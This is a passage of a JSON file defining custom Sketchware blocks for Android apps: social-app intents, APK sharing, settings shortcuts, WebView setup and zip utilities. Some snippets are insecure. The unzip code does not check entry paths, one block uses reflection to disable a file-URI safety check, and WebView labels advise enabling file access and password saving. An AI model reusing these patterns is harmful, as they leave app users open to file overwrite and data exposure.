uri); likeIng.setPackage(\"org.telegram.messenger\"); try { startActivity(likeIng); } catch (ActivityNotFoundException e) { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://t.me/sketchware_kurdish\"))); }","color":"#FF37ABE8","name":"Telegram","typeName":"","palette":"116","type":" ","spec":"Intent Telegram URL %s.inputOnly "},{"code":"Uri uri \u003d Uri.parse(\"%s\"); Intent likeIng \u003d new Intent(Intent.ACTION_VIEW, uri); likeIng.setPackage(\"com.snapchat.android\"); try { startActivity(likeIng); } catch (ActivityNotFoundException e) { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://t.me/sketchware_kurdish\"))); }","color":"#FFFFEA00","name":"Snapchat","typeName":"","palette":"116","type":" ","spec":"Intent Snapchat URL %s.inputOnly "},{"code":"Uri uri \u003d Uri.parse(\"%s\"); Intent likeIng \u003d new Intent(Intent.ACTION_VIEW, uri); likeIng.setPackage(\"com.twitter.android\"); try { startActivity(likeIng); } catch (ActivityNotFoundException e) { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://t.me/sketchware_kurdish\"))); }","color":"#FF37ABE8","name":"Twitter","typeName":"","palette":"116","type":" ","spec":"Intent Twitter URL %s.inputOnly "},{"code":"Uri uri \u003d Uri.parse(\"%s\"); Intent likeIng \u003d new Intent(Intent.ACTION_VIEW, uri); likeIng.setPackage(\"com.google.android.youtube\"); try { startActivity(likeIng); } catch (ActivityNotFoundException e) { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://t.me/sketchware_kurdish\"))); }","color":"#FFF44336","name":"Youtube","typeName":"","palette":"116","type":" ","spec":"Intent Youtube URL %s.inputOnly "},{"code":"Uri uri \u003d Uri.parse(\"%s\"); Intent likeIng \u003d new Intent(Intent.ACTION_VIEW, uri); likeIng.setPackage(\"com.android.vending\"); try { startActivity(likeIng); } catch (ActivityNotFoundException e) { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://t.me/sketchware_kurdish\"))); }","color":"#FFFFC107","name":"Play Store","typeName":"","palette":"116","type":" ","spec":"Intent Play Store URL %s.inputOnly "},{"code":"","color":"#FF9C27B0","name":"Added By Kurdish Team ( Amin , Muhammed)","typeName":"","palette":"115","type":"h","spec":"put it into on create / extra more block"},{"code":"","color":"#FF9C27B0","name":"put into moreblock","typeName":"","palette":"115","type":"h","spec":"put it into on create / extra more block"},{"code":"}\nprivate void shareApplication() { \n\t\t\t\t\t\tandroid.content.pm.ApplicationInfo app \u003d \n\t\t\t\t\t\tgetApplicationContext().getApplicationInfo(); \n\t\t\t\t\t\tString filePath \u003d app.sourceDir;\n\t\t\t\t\t\tIntent intent \u003d new Intent(Intent.ACTION_SEND); \n\t\t\t\t\t\tintent.setType(\"*/*\"); \n\t\t\t\t\t\tjava.io.File originalApk \u003d new java.io.File(filePath); \n\t\t\t\t\t\ttry {  \n\t\t\t\t\t\t\t\tjava.io.File tempFile \u003d new java.io.File(getExternalCacheDir() + \"/ExtractedApk\"); \n\t\t\t\t\t\t \t\tif (!tempFile.isDirectory()) \n\t\t\t\t\t\t\t\t\tif (!tempFile.mkdirs()) \n\t\t\t\t\t\t\t\t\treturn; \n\t\t\t\t\t\t\t\t\ttempFile \u003d new java.io.File(tempFile.getPath() + \"/\" + \n\t\t\t\t\t\t\t\t\t\"export.apk\");\n\t\t\t\t\t\t\t\t\tif (!tempFile.exists()) \n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\ttry{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif (!tempFile.createNewFile()) { \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treturn; }\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcatch (java.io.IOException e){} \n\t\t\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\t\t\tjava.io.InputStream in \u003d new java.io.FileInputStream (%s.Apk);\n\t\t\t\t\t\t\t\t\tjava.io.OutputStream out \u003d new java.io.FileOutputStream(tempFile);\n\t\t\t\t\t\t\t\t\tbyte[] buf \u003d new byte[1024];\n\t\t\t\t\t\t\t\t\tint len; \n\t\t\t\t\t\t\t\t\twhile ((len \u003d in.read(buf)) \u003e 0) { \n\t\t\t\t\t\t\t\t\t\t\t\tout.write(buf, 0, len); \n\t\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\t\t\tin.close(); \n\t\t\t\t\t\t\t\t\tout.close(); \n\t\t\t\t\t\t\t\t\tintent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(tempFile));\n\t\t\t\t\t\t\t\t\tstartActivity(Intent.createChooser(intent, \"Share app via\"));\n\t\t\t\t\t\t} \n\t\t\t\t\t\tcatch (java.io.IOException e) \n\t\t\t\t\t\t{ showMessage(e.toString()); \n\t\t\t\t\t\t} \n\t\t\t}\n{","color":"#FF9C27B0","name":"your app name","typeName":"","palette":"115","type":" ","spec":"your app name %s.inputOnly "},{"code":"","color":"#FF9C27B0","name":"put into oncreate","typeName":"","palette":"115","type":"h","spec":"put it into OnCreate"},{"code":"\t\t\tStrictMode.VmPolicy.Builder builder \u003d \n\t\t\t\tnew StrictMode.VmPolicy.Builder(); \n\t\t\t\tStrictMode.setVmPolicy(builder.build());\n\t\t\t\tif(Build.VERSION.SDK_INT\u003e\u003d24){ \n\t\t\t\t\t    try{\n\t\t\t\t\t\t\t\tjava.lang.reflect.Method m \u003d \n\t\t\t\t\t\t        StrictMode.class.getMethod(\n\t\t\t\t\t\t\t\t\"disableDeathOnFileUriExposure\"); \n\t\t\t\t\t\t        m.invoke(null); \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch(Exception e){ \n\t\t\t\t\t\t\t\tshowMessage(e.toString()); \n\t\t\t\t\t\t\t} \n\t\t\t\t}","color":"#FF9C27B0","name":"oncreate","typeName":"","palette":"115","type":" ","spec":"put block into OnCreate"},{"code":"","color":"#FF9C27B0","name":"put into on click view","typeName":"","palette":"115","type":"h","spec":"put it into on click view"},{"code":"shareApplication();","color":"#FF9C27B0","name":"put into on click viewh","typeName":"","palette":"115","type":" ","spec":"put block into OnClick view"},{"code":"finishAffinity();","color":"#FF0040FF","name":"","typeName":"","palette":"85","type":" ","spec":"Close App"},{"code":"Intent open_nfc \u003d new Intent(android.provider.Settings.ACTION_NFC_SETTINGS);\nstartActivity(open_nfc);","color":"#FF0040FF","name":"","typeName":"","palette":"85","type":" ","spec":"Intent - Open NFC settings"},{"code":"Intent open_privacy \u003d new Intent(android.provider.Settings.ACTION_PRIVACY_SETTINGS);\nstartActivity(open_privacy);","color":"#FF0040FF","name":"","typeName":"","palette":"85","type":" ","spec":"Intent - Open PRIVACY settings"},{"code":"Intent open_wifiip \u003d new Intent(android.provider.Settings.ACTION_WIFI_IP_SETTINGS\n);\nstartActivity(open_wifiip);","color":"#FF0040FF","name":"","typeName":"","palette":"85","type":" ","spec":"Intent - Open WIFI IP settings"},{"code":"       %1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onItemClick(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\t\t\tfinal int pos \u003d _param3;\r\n\t\t\t\t%2$s\n\t\t\t}\r\n\t\t});","name":"GridViewOnClick","palette":"21","type":"c","spec":"%m.GridView onItemClick"},{"code":"%1$s.requestWindowFeature(Window.FEATURE_NO_TITLE);  %1$s.getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(Color.TRANSPARENT));","color":"#FF6E17FF","name":"transparent","typeName":"","palette":"15","type":" ","spec":"Transparent dialog name %s.inputOnly  dialog name %s.inputOnly "},{"code":"speed \u003d %s;","color":"#FFC62828","name":"speed set","typeName":"","palette":"12","type":" ","spec":"set speed %d"},{"code":"%m.clearColorFilter();","color":"#FF0080FF","name":"Clear Color Filter","typeName":"","palette":"10","type":" ","spec":"%m.imageview clearColorFilter"},{"code":"overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);","color":"#FF2196F3","name":"aimation view","typeName":"","palette":"127","type":" ","spec":"Override Activity Animation"},{"code":"%s.setVerticalScrollBarEnabled(%s);","color":"#FF2196F3","name":"Hide Scroll listview","typeName":"","palette":"127","type":" ","spec":"%m.listview  Hide scrollbar from listview %b  "},{"code":"//Easy Developer//\n//xml:-Your package name.TitanicTextView//\n//Blocks By Sk Imagine//\nnew Titanic().start(%1$s);","color":"#FF3F51B5","name":"Titanic Textview","typeName":"","palette":"128","type":" ","spec":"Titanic %m.textview  start Animation"},{"code":"%s.setFriction(%sf);","color":"#FF2196F3","name":"Listview scroll speed","typeName":"","palette":"127","type":" ","spec":"%m.listview Scroll Speed  %d "},{"code":"","color":"#FF2196F3","name":" ","typeName":"","palette":"127","type":"h","spec":"use animation listview block in on bind listview"},{"code":"Animation animation; animation \u003d AnimationUtils.loadAnimation( getApplicationContext(), android.R.anim.slide_in_left ); animation.setDuration(%2$s);\n%1$s.startAnimation(animation); animation \u003d null;","color":"#FF2196F3","name":"animation Listview","typeName":"","palette":"127","type":" ","spec":"%m.view Animation listview%d   "},{"code":"((ArrayAdapter)%s1.getAdapter()).getFilter().filter(%s2.getText().toString());","color":"#FF2196F3","name":"Listview Search","typeName":"","palette":"127","type":" ","spec":"%m.listview  Listview search  string to %m.edittext "},{"code":"ActionBar.setElevation(%s);","color":"#FF2196F3","name":"A E","typeName":"","palette":"127","type":" ","spec":"ActionBar Set Elevation %d "},{"code":"_toolbar.setNavigationOnClickListener(new View.OnClickListener(){ \t\t\t@Override \t\t\tpublic void onClick(View _v) { \t\t\t _drawer.openDrawer(Gravity.RIGHT); \t\t\t} \t\t}); LinearLayout _nav_view \u003d (LinearLayout) findViewById(R.id._nav_view); androidx.drawerlayout.widget.DrawerLayout\n.LayoutParams lp \u003d new androidx.drawerlayout.widget.DrawerLayout\n.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.MATCH_PARENT); lp.gravity\u003dGravity.RIGHT; _nav_view.setLayoutParams(lp);","color":"#FF2196F3","name":"right drawer","typeName":"","palette":"113","type":" ","spec":"Right drawer put block in on create"},{"code":"_drawer.openDrawer(Gravity.RIGHT);","color":"#FF2196F3","name":"open rd","typeName":"","palette":"113","type":" ","spec":"Open right drawer"},{"code":"Intent i \u003d new Intent(android.content.Intent.ACTION_SEND); i.setType(\"text/plain\"); i.putExtra(android.content.Intent.EXTRA_TEXT, %s); startActivity(Intent.createChooser(i,%s));","color":"#FF9C27B0","name":"Share Text","typeName":"","palette":"115","type":" ","spec":"Share The text ( %s ) with message %s"},{"code":"Bitmap bm \u003d ((android.graphics.drawable.BitmapDrawable) %s.getDrawable()).getBitmap(); try { java.io.File file \u003d new java.io.File(getExternalCacheDir() + \"/image.jpg\"); java.io.OutputStream out \u003d new java.io.FileOutputStream(file); bm.compress(Bitmap.CompressFormat.JPEG, 100, out); out.flush(); out.close(); } catch (Exception e) { showMessage(e.toString()); } Intent iten \u003d new Intent(android.content.Intent.ACTION_SEND); iten.setType(\"*/*\"); iten.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(getExternalCacheDir() + \"/image.jpg\"))); startActivity(Intent.createChooser(iten, \"Send image\"));","color":"#FF9C27B0","name":"ShareImage","typeName":"","palette":"115","type":" ","spec":"Share %m.imageview"},{"code":"appUpdateManager \u003d AppUpdateManagerFactory.create(%1$s.this);  \n     appUpdateManager.getAppUpdateInfo().addOnSuccessListener(new OnSuccessListener\u003cAppUpdateInfo\u003e() {  \n       @Override  \n       public void onSuccess(AppUpdateInfo result) {  \n         if((result.updateAvailability() \u003d\u003d UpdateAvailability.UPDATE_AVAILABLE)  \n           \u0026\u0026 result.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE))  \n         {  \n           try {  \n             appUpdateManager.startUpdateFlowForResult(  \n                 result,  \n                 AppUpdateType.IMMEDIATE,  \n                 %1$s.this,  \n                 RequestUpdate);  \n             }  \n           catch (IntentSender.SendIntentException e)  \n           {  \n             e.printStackTrace();  \n           }  \n         }  \n       }  \n     });  ","color":"#FF4CAF50","name":"IN APP UPDATE ON_CREATE","typeName":"","palette":"129","type":" ","spec":"IN APP UPDATE ON_CREATE AT  %m.activity "},{"code":"appUpdateManager.getAppUpdateInfo().addOnSuccessListener(new OnSuccessListener\u003cAppUpdateInfo\u003e() {  \n       @Override  \n       public void onSuccess(AppUpdateInfo result) {  \n         if(result.updateAvailability() \u003d\u003d UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS)  \n         {  \n           try {  \n             appUpdateManager.startUpdateFlowForResult(  \n                 result,  \n                 AppUpdateType.IMMEDIATE,  \n                 %1$s.this,  \n                 RequestUpdate);  \n           }  \n           catch (IntentSender.SendIntentException e)  \n           {  \n             e.printStackTrace();  \n           }  \n         }  \n       }  \n     });  ","color":"#FF4CAF50","name":"IN  APP UPDATE ON_RESUME","typeName":"","palette":"129","type":" ","spec":"IN APP UPDATE ON_RESUME AT  %m.activity"},{"code":"%1$s.getSettings().setUserAgentString(\"Mozilla/%2$s (Android) AppleWebKit/%3$s (KHTML, like Gecko) Chrome/%4$s Safari/%3$s\");","color":"#FFFFC107","name":"WEBVIEW USER AGENT","typeName":"","palette":"130","type":" ","spec":"WEBVIEW  %m.WebView USER AGENT | MOZILLA \u003d %s.inputOnly (DEVELOPERS RECOMMEND 80.1.3 ) | APPLE OR SAFARI %s.inputOnly (DEVELOPERS RECOMMEND 537.36) | CHROME \u003d %s.inputOnly  (DEVELOPERS RECOMMEND 85.0.4183.101 )"},{"code":"%1$s.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);\r\n%1$s.loadUrl(\"%2$s\");\n%1$s.setWebChromeClient(new WebChromeClient());\r\n%1$s.requestFocus();\r\n%1$s.getSettings().setJavaScriptEnabled(%3$s);\r\n%1$s.getSettings().setJavaScriptCanOpenWindowsAutomatically(%4$s);\r\n%1$s.getSettings().setDatabaseEnabled(%5$s); %1$s.getSettings().setDatabasePath(getApplicationContext().getCacheDir().getAbsolutePath() + \"/databases\" );\n%1$s.getSettings().setAppCacheMaxSize(5*1024*1024); %1$s.getSettings().setAppCachePath(getApplicationContext().getCacheDir().getAbsolutePath() + \"/catch\" ); \n%1$s.getSettings().setAppCacheEnabled(%6$s);\r\n%1$s.getSettings().setAllowFileAccess(%7$s);\n%1$s.getSettings().setAllowContentAccess(%8$s);\r\n%1$s.getSettings().setLoadWithOverviewMode(%9$s);\n%1$s.getSettings().setUseWideViewPort(%10$s);\n%1$s.getSettings().setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);\r\n%1$s.getSettings().setDomStorageEnabled(%11$s);\n%1$s.getSettings().setSaveFormData(%12$s);\n%1$s.getSettings().setSavePassword(%13$s);\r\n%1$s.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);\r\n%1$s.setScrollBarStyle(WebView.SCROLLBARS_OUTSIDE_OVERLAY); %1$s.setScrollbarFadingEnabled(%14$s);\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.KITKAT) {\n\t%1$s.setLayerType(View.LAYER_TYPE_HARDWARE, null); \n} else { \n\t%1$s.setLayerType(View.LAYER_TYPE_SOFTWARE, null);\n}\r\n%1$s.setFocusable(%15$s);\n%1$s.setFocusableInTouchMode(%15$s);\n%1$s.getSettings().setLightTouchEnabled(%16$s);\n%1$s.getSettings().setLoadsImagesAutomatically(%17$s);\n%1$s.getSettings().setEnableSmoothTransition(%18$s);\r\n%1$s.getSettings().setBuiltInZoomControls(%19$s);\n%1$s.getSettings().setDisplayZoomControls(%19$s);\n%1$s.getSettings().setGeolocationEnabled(%20$s);\n%1$s.setSoundEffectsEnabled(%21$s);\r\nCookieManager.getInstance().setAcceptCookie(%22$s);\n%1$s.getSettings().setSupportMultipleWindows(%23$s);\n%1$s.getSettings().setBlockNetworkImage(%24$s);","color":"#FFFFC107","name":"WEBVIEW ALL IN ONE","typeName":"","palette":"130","type":" ","spec":"WEBVIEW %m.WebView ALL IN ONE | LOAD URL \u003d %s.inputOnly  | JAVA SCRIPT ENABLE \u003d %b  ( DEVELOPERS RECOMMEND TRUE) | JAVASCRIPT CAN OPEN WINDOW \u003d %b  ( DEVELOPERS RECOMMEND FALSE) | DATABASE \u003d %b (DEVELOPERS RECOMMEND TRUE) | APP CATCH \u003d %b  ( DEVELOPERS RECOMMEND TRUE OR FALSE) | ALLOW FILE ACCESS \u003d %b  (DEVELOPERS RECOMMEND TRUE) | ALLOW CONTENT ACCESS \u003d %b  ( DEVELOPERS RECOMMEND TRUE) | LOAD WITH OVERVIEW MODE \u003d %b  (DEVELOPERS RECOMMEND TRUE) | USE WIDE VIEW \u003d %b  ( DEVELOPERS RECOMMEND TRUE) | DOM STORAGE \u003d %b  (DEVELOPERS RECOMMEND TRUE) | SAVE FROM DATA \u003d %b  (DEVELOPERS RECOMMEND TRUE) | SAVE PASSWORD \u003d %b  (DEVELOPERS RECOMMEND TRUE) | SCROLLING FADING \u003d %b  (DEVELOPERS RECOMMEND FALSE) | FOCUS \u003d %b  (DEVELOPERS RECOMMEND TRUE) | LIGHT TOUCH \u003d %b  (DEVELOPERS RECOMMEND TRUE) | LOAD IMAGE AUTOMATICALLY \u003d %b  (DEVELOPERS RECOMMEND TRUR) | SMOOTH TRANSITION \u003d %b  (DEVELOPERS RECOMMEND TRUE) | ZOOM \u003d %b  ( DEVELOPERS RECOMMEND TRUE OR FLASE) | GEO LOCATION \u003d %b  (DEVELOPERS RECOMMEND TRUE) | SOUNDS EFFECT \u003d %b  (DEVELOPERS RECOMMEND TRUE) | COOKIE \u003d %b  (DEVELOPERS RECOMMEND TRUE OR FLASE) | SUPPORT MULTIPLE WINDOW \u003d%b (DEVELOPERS RECOMMEND TRUE) | IMAGE LOAD FAST \u003d%b  (DEVELOPERS RECOMMEND TRUE)"},{"code":"%1$s.getOriginalUrl()","color":"#FF2196F3","name":"WEBVIEW ORIGINAL URL","typeName":"","palette":"130","type":"s","spec":"%m.WebView GET ORIGINAL URL"},{"code":"try {\n    File file \u003d new File(%2$s);\n Writer fWriter;\nfWriter \u003d new BufferedWriter(new FileWriter(file, true));\nfWriter.append(\n%1$s);\nfWriter.close();\n }catch(Exception e){\n          e.printStackTrace();\n }","color":"#FF2196F3","name":"append text to file ","typeName":"","palette":"127","type":" ","spec":"V2 append texr %s to file path %s"},{"code":"\n\t\t\tString filen \u003d %1$s;\n         String path \u003d %2$s;\nfinal String assetFilename\u003d(filen);\r\n\t\t\tfinal String assetSavePath\u003d(path);\r\n\n\t\t\ttry{\n\t\t\t\tint count;\n\t\t\t\tjava.io.InputStream input \u003d getAssets().open(assetFilename);\n\t\t\t\tjava.io.OutputStream output \u003d new  java.io.FileOutputStream(assetSavePath+\"/\"+assetFilename);\n\t\t\t\tbyte data[] \u003d new byte[1024];\n\t\t\t\twhile ((count \u003d input.read(data))\u003e0) {\n\t\t\t\t\toutput.write(data, 0, count);\n\t\t\t\t}\n\t\t\t\toutput.flush();\n\t\t\t\toutput.close();\n\t\t\t\tinput.close();\n\t\t\t\t\r\n\t\t\t\tSketchwareUtil.showMessage(getApplicationContext(), %3$s);\r\n\t\t\t}catch(Exception e){\n\t\t\t\t\r\n\t\t\t\tSketchwareUtil.showMessage(getApplicationContext(), %4$s);\r\n\t\t\t}\r\n\t\t\n\t\t\n\t","color":"#FF2196F3","name":"copy from assets ","typeName":"","palette":"127","type":" ","spec":"copy assets %s to path %s success message %s failed message %s"},{"code":"\n\t\tfinal ProgressDialog progressDialog \u003d new ProgressDialog(%1$s.this);\nfinal Handler handle \u003d new Handler() {\n@Override\npublic void handleMessage(Message msg) {\nsuper.handleMessage(msg);progressDialog.incrementProgressBy(%6$s); }\n};\n\n\nprogressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);\nprogressDialog.setMax(%5$s);progressDialog.setTitle(%2$s);\nprogressDialog.setMessage(%3$s);progressDialog.setIndeterminate(false);\nprogressDialog.setCancelable(%7$s);\nprogressDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.%4$s));\nprogressDialog.show();\n\n\nnew Thread(new Runnable() {\n@Override public void run() {\ntry {\nwhile (progressDialog.getProgress() \u003c\u003d progressDialog.getMax()) {\nThread.sleep(200);handle.sendMessage(handle.obtainMessage());\nif (progressDialog.getProgress() \u003d\u003d progressDialog.getMax()) {\nprogressDialog.dismiss();\n}\n}\n} catch (Exception e) {\ne.printStackTrace();\n}\n}\n}).start();","color":"#FF2196F3","name":"custom progress Dialog","typeName":"","palette":"127","type":" ","spec":"activity %m.activity title %s message %s color %s.inputOnly max %d vitess %d cancelable %b"},{"code":"final String _fileZip\u003d(%1$s);\nfinal String _destDir\u003d(%2$s);\r\n\t\t\t\t\r\n\t\t\t\ttry\r\n\t\t\t\t{\r\n\t\t\t\t\tjava.io.File outdir \u003d new java.io.File(_destDir);\r\n\t\t\t\t\tjava.util.zip.ZipInputStream zin \u003d new java.util.zip.ZipInputStream(new java.io.FileInputStream(_fileZip));\r\n\t\t\t\t\tjava.util.zip.ZipEntry entry;\r\n\t\t\t\t\tString name, dir;\r\n\t\t\t\t\twhile ((entry \u003d zin.getNextEntry()) !\u003d null)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tname \u003d entry.getName();\r\n\t\t\t\t\t\tif(entry.isDirectory())\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tmkdirs(outdir, name);\r\n\t\t\t\t\t\t\tcontinue;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t/* this part is necessary because file entry can come before\r\n* directory entry where is file located\r\n* i.e.:\r\n* /foo/foo.txt\r\n* /foo/\r\n*/\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\tdir \u003d dirpart(name);\r\n\t\t\t\t\t\tif(dir !\u003d null)\r\n\t\t\t\t\t\tmkdirs(outdir, dir);\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\textractFile(zin, outdir, name);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tzin.close();\r\n\t\t\t\t}\r\n\t\t\t\tcatch (java.io.IOException e)\r\n\t\t\t\t{\r\n\t\t\t\t\te.printStackTrace();\r\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t}\r\n\t\t\tprivate  void extractFile(java.util.zip.ZipInputStream in, java.io.File outdir, String name) throws java.io.IOException\r\n\t\t\t{\r\n\t\t\t\tbyte[] buffer \u003d new byte[4096];\r\n\t\t\t\tjava.io.BufferedOutputStream out \u003d new java.io.BufferedOutputStream(new java.io.FileOutputStream(new java.io.File(outdir, name)));\r\n\t\t\t\tint count \u003d -1;\r\n\t\t\t\twhile ((count \u003d in.read(buffer)) !\u003d -1)\r\n\t\t\t\tout.write(buffer, 0, count);\r\n\t\t\t\tout.close();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tprivate void mkdirs(java.io.File outdir, String path)\r\n\t\t\t{\r\n\t\t\t\tjava.io.File d \u003d new java.io.File(outdir, path);\r\n\t\t\t\tif(!d.exists())\r\n\t\t\t\td.mkdirs();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tprivate String dirpart(String name)\r\n\t\t\t{\r\n\t\t\t\tint s \u003d name.lastIndexOf(java.io.File.separatorChar);\r\n\t\t\t\treturn s \u003d\u003d -1 ? null : name.substring(0, s);\r\n\t\t\t","color":"#FF2196F3","name":"Unzip2","typeName":"","palette":"127","type":" ","spec":"Unzip from %s.fileZip to %s.destDir"},{"code":"\r\n\t\t\r\n\t\tfinal String _source\u003d(%1$s);\n\t\tfinal String _destination\u003d(%2$s);\r\n\t\t\t\t\r\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tjava.util.zip.ZipOutputStream os \u003d new java.util.zip.ZipOutputStream(new java.io.FileOutputStream(_destination));\n\t\t\t\t\t\t\t\t\t\tzip(os, _source, null);\n\t\t\t\t\t\t\t\t\t\tos.close();\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\tcatch(java.io.IOException e) {}\r\n\t\t\t\t}\r\n\t\t\t\tprivate void zip(java.util.zip.ZipOutputStream os, String filePath, String name) throws java.io.IOException\n\t\t\t\t\t{\n\t\t\t\t\t\t\t\tjava.io.File file \u003d new java.io.File(filePath);\n\t\t\t\t\t\t\t\tjava.util.zip.ZipEntry entry \u003d new java.util.zip.ZipEntry((name !\u003d null ? name + java.io.File.separator : \"\") + file.getName() + (file.isDirectory() ? java.io.File.separator : \"\"));\n\t\t\t\t\t\t\t\tos.putNextEntry(entry);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif(file.isFile()) {\n\t\t\t\t\t\t\t\t\t\t\tjava.io.InputStream is \u003d new java.io.FileInputStream(file);\n\t\t\t\t\t\t\t\t\t\t\tint size \u003d is.available();\n\t\t\t\t\t\t\t\t\t\t\tbyte[] buff \u003d new byte[size];\n\t\t\t\t\t\t\t\t\t\t\tint len \u003d is.read(buff);\n\t\t\t\t\t\t\t\t\t\t\tos.write(buff, 0, len);\n\t\t\t\t\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tjava.io.File[] fileArr \u003d file.listFiles();\n\t\t\t\t\t\t\t\tfor(java.io.File subFile : fileArr) {\n\t\t\t\t\t\t\t\t\t\t\tzip(os, subFile.getAbsolutePath(), entry.getName());\n\t\t\t\t\t\t\t\t}","color":"#FF2196F3","name":"zip from to","typeName":"","palette":"127","type":" ","spec":"zip from %s.source to %s.destination"},{"code":"startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://%1$s\")));","color":"#FF795548","name":"Open Link ","typeName":"","palette":"85","type":" ","spec":"open Link %s.inputOnly"},{"code":"","color":"#000000","name":"","typeName":"","palette":"85","type":"h","spec":"Open specific setting"},{"code":"Intent intent \u003d new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);\nstartActivityForResult(intent, 0);","color":"#000000","name":"oppen accessibility settings","typeName":"","palette":"85","type":" ","spec":"open accessibility settings"},{"code":"Intent intent \u003d new Intent(android.provider.Settings.ACTION_ADD_ACCOUNT);\nstartActivityForResult(intent, 0);","color":"#000000","name":"open add accout device settings","typeName":"","palette":"85","type":" ","spec":"open add account device settings"},{"code":"Intent intent \u003d new Intent(android.provider.Settings.ACTION_AIRPLANE_MODE_SETTINGS);\nstartActivityForResult(intent, 0);","color":"#000000","name":"open aireplan settings","typeName":"","palette":"85","type":" ","spec":"open airplane settings"},{"code":"Intent intent \u003d new Intent(android.provider.Settings.ACTION_APN_SETTINGS);\nstartActivityForResult(intent, 0);","color":"#000000","name":"open APN settings ","typeName":"","palette":"85","type":" ","spec":"open APN settings"},{"code":"Intent intent \u003d new Intent(android.provider.Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS);\nstartActivityForResult(intent, 0);","color":"#000000","name":"open Developer options ","typeName":"","palette":"85","type":" ","spec":"open Developper Options"},{"code":"Intent myAppSettings \u003d new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse(\"package:\" + getPackageName())); myAppSettings.addCategory(Intent.CATEGORY_DEFAULT); myAppSettings.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(myAppSettings); ","color":"#000000","name":"open your app settings","typeName":"","palette":"85","type":" ","spec":"open your app settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION); startActivity(callSettingIntent);","color":"#000000","name":"open display over the apps settings ","typeName":"","palette":"85","type":" ","spec":"open display over the apps setings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_FINGERPRINT_ENROLL); startActivity(callSettingIntent);","color":"#000000","name":"open fingerprint settings","typeName":"","palette":"85","type":" ","spec":"open fingerprint settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_BATTERY_SAVER_SETTINGS); startActivity(callSettingIntent);","color":"#000000","name":"open battery saver settings","typeName":"","palette":"85","type":" ","spec":"open battery saver settings "},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_DATA_ROAMING_SETTINGS); startActivity(callSettingIntent);","color":"#000000","name":"open data settingns to choose 3g or 4g","typeName":"","palette":"85","type":" ","spec":"open mobile data settings 3g/4g"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_DATE_SETTINGS); startActivity(callSettingIntent);","color":"#000000","name":"open settings date and time","typeName":"","palette":"85","type":" ","spec":"open date and time settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS);\n            startActivity(callSettingIntent);","color":"#000000","name":"open display settings","typeName":"","palette":"85","type":" ","spec":"open display settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);\n       startActivity(callSettingIntent);","color":"#000000","name":"open battery obtimization settings","typeName":"","palette":"85","type":" ","spec":"open battery optimization settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_INPUT_METHOD_SETTINGS);\n startActivity(callSettingIntent);","color":"#000000","name":"open manage/choose keyboards settings ","typeName":"","palette":"85","type":" ","spec":"open manage/choose keyboard settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_INTERNAL_STORAGE_SETTINGS);\n            startActivity(callSettingIntent);","color":"#000000","name":"open storage settings","typeName":"","palette":"85","type":" ","spec":"open storage settings"},{"code":"Intent 